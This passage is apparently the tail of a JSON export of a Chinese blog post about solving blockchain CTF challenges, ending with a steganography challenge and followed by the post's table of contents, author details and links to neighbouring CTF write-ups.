punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"0x03-元宇宙大师\"><a href=\"#0x03-元宇宙大师\" class=\"headerlink\" title=\"0x03 元宇宙大师\"></a>0x03 元宇宙大师</h1><p>safemint的两个图片隐写，用工具解密以下得到flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230227102106456.png\"></p>\n","text":"0x01 SignInCodepragma solidity 0.4.23; contract Checkin &#123; string public welcomeMessage ; uint16 public year ; constructor ( string _mss...","link":"","photos":[],"count_time":{"symbolsCount":"5.1k","symbolsTime":"5 mins."},"categories":[],"tags":[{"name":"区块链 ctf","slug":"区块链-ctf","count":12,"path":"api/tags/区块链-ctf.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x01-SignIn\"><span class=\"toc-text\">0x01 SignIn</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyse\"><span class=\"toc-text\">Analyse</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x02\"><span class=\"toc-text\">0x02</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-1\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyse-1\"><span class=\"toc-text\">Analyse</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-1\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x03-%E5%85%83%E5%AE%87%E5%AE%99%E5%A4%A7%E5%B8%88\"><span class=\"toc-text\">0x03 元宇宙大师</span></a></li></ol>","author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/296321666270692_.pic.jpg","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Paradigm CTF 2021","uid":"e4a055270fc77b5d73f92a425173cb60","slug":"Paradigm  CTF 2021","date":"2022-10-15T12:42:45.830Z","updated":"2022-12-05T18:19:44.978Z","comments":true,"path":"api/articles/Paradigm  CTF 2021.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/CTF.c4f7e58a.png","text":"由于团队的需要，需要复现一下Paradigm CTF 2021。 1.ReverCodepragma solidity 0.8.0; contract Deployer &#123; constructor(bytes memory code) &#123; assembly &...","link":"","photos":[],"count_time":{"symbolsCount":"88k","symbolsTime":"1:20"},"categories":[],"tags":[{"name":"区块链","slug":"区块链","count":19,"path":"api/tags/区块链.json"}],"author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/296321666270692_.pic.jpg","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"Quill Audit CTF","uid":"44a7f484fa434c0aa60841dc0d5e49cd","slug":"quii","date":"2023-01-27T06:00:47.995Z","updated":"2023-03-14T00:44:25.750Z","comments":true,"path":"api/articles/quii.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image?url=https%253A%252F%252Fsuper-static-assets.s3.amazonaws.com%252Fa799195c-7c08-410a-9254-50dd9f21a772%252Fimages%252Fa910cf7c-97f8-4902-8d32-7e8fe79312f8.png","text":"QuillCTF看到Quill在弄的区块链安全CTF题目，看到完成奖励很是心动 只是可惜，发现这个挑战时候已经结束了五道题，只剩下三道题目，不过看起来应该还在更新之中，本着挑战一下的心态还是来试一试吧 0x0C WETH11Codepragma solidity ^0.8.0; ...","link":"","photos":[],"count_time":{"symbolsCount":"32k","symbolsTime":"29 mins."},"categories":[],"tags":[{"name":"区块链","slug":"区块链","count":19,"path":"api/tags/区块链.json"}],"author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/296321666270692_.pic.jpg","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}